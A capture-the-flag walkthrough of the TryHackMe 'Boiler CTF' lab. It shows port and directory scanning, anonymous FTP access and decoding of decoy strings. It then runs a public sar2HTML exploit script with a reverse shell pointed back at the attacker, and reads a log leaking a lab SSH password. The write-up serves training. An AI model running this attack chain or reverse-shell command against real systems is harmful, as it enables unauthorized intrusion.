# Boiler CFT
link to the machine: https://tryhackme.com/r/room/boilerctf2

let's start with network scanning
~~~
nmap -sV -Pn 10.10.70.176 -p-
~~~
output:
~~~
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~
### Question 2: What is on the highest port?
> ssh

### Question 3: What's running on port 10000?
> webmin

we found various services. Let's first try to log in with anonymous user to ftp service and search for some interesting files
~~~
ftp anonymous@10.10.70.176 
Connected to 10.10.70.176.
220 (vsFTPd 3.0.3)
230 Login successful.
~~~
there is an hidden file called info.txt:
~~~
ftp> ls -la
229 Entering Extended Passive Mode (|||49347|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
~~~
### Question 1: file extension after anon login
>txt

the file contains this message:
> Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

the message seems to be encrypted with ROT13, let's try to decrypt it using cyberchef
> Just wanted to see if you find it. Lol. Remember: Enumeration is the key!

Ok now we start enumerate Apache server with gobuster:
~~~
gobuster dir -u http://10.10.70.176 -w /usr/share/wordlists/dirb/common.txt -t 50
~~~
We found some directory, and we found a joomla cms
~~~
/index.html
/joomla
/manual           
/robots.txt 
~~~
In robots.txt we have some rabbit hole folders and an ascii string:
~~~
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
~~~
try to decode it
~~~
OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
~~~
it seems base 64
~~~
99b0660cd95adea327c54182baa51584
~~~
try to crack MD5 hash
~~~
kidding
~~~
Oh no, another rabbit hole

Now we can try enumerating joomla cms
~~~
gobuster dir -u http://10.10.70.176/joomla/ -w /usr/share/wordlists/dirb/common.txt -t 50
~~~
~~~
/.htaccess            (Status: 403) [Size: 303]
/.hta                 (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 303]
/_archive             (Status: 301) [Size: 322] [--> http://10.10.70.176/joomla/_archive/]
/_database            (Status: 301) [Size: 323] [--> http://10.10.70.176/joomla/_database/]
/_files               (Status: 301) [Size: 320] [--> http://10.10.70.176/joomla/_files/]
/_test                (Status: 301) [Size: 319] [--> http://10.10.70.176/joomla/_test/]
/~www                 (Status: 301) [Size: 318] [--> http://10.10.70.176/joomla/~www/]
/administrator        (Status: 301) [Size: 327] [--> http://10.10.70.176/joomla/administrator/]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.70.176/joomla/bin/]
/build                (Status: 301) [Size: 319] [--> http://10.10.70.176/joomla/build/]
/cache                (Status: 301) [Size: 319] [--> http://10.10.70.176/joomla/cache/]
/components           (Status: 301) [Size: 324] [--> http://10.10.70.176/joomla/components/]
/images               (Status: 301) [Size: 320] [--> http://10.10.70.176/joomla/images/]
/includes             (Status: 301) [Size: 322] [--> http://10.10.70.176/joomla/includes/]
/installation         (Status: 301) [Size: 326] [--> http://10.10.70.176/joomla/installation/]
/index.php            (Status: 200) [Size: 12478]
/language             (Status: 301) [Size: 322] [--> http://10.10.70.176/joomla/language/]
/layouts              (Status: 301) [Size: 321] [--> http://10.10.70.176/joomla/layouts/]
/libraries            (Status: 301) [Size: 323] [--> http://10.10.70.176/joomla/libraries/]
/media                (Status: 301) [Size: 319] [--> http://10.10.70.176/joomla/media/]
/modules              (Status: 301) [Size: 321] [--> http://10.10.70.176/joomla/modules/]
/plugins              (Status: 301) [Size: 321] [--> http://10.10.70.176/joomla/plugins/]
/templates            (Status: 301) [Size: 323] [--> http://10.10.70.176/joomla/templates/]
/tests                (Status: 301) [Size: 319] [--> http://10.10.70.176/joomla/tests/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.70.176/joomla/tmp/]
~~~
In the /_test folder i found sar2HTML, searching on google i found a github repo for expolit it: https://github.com/AssassinUKG/sar2HTML

~~~
python3 sar2HTMLshell.py -ip <machine vulnerable>/joomla/_test/index.php -rip <machine target>:<port> -pe sar2HTML
~~~
Now with rs session we start a revshell as wwwdata user.
Running ls command in the folder /var/www/html/joomla/_test
~~~
-rwxr-xr-x  1 www-data www-data  716 Aug 21  2019 log.txt
~~~
~~~
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.

~~~


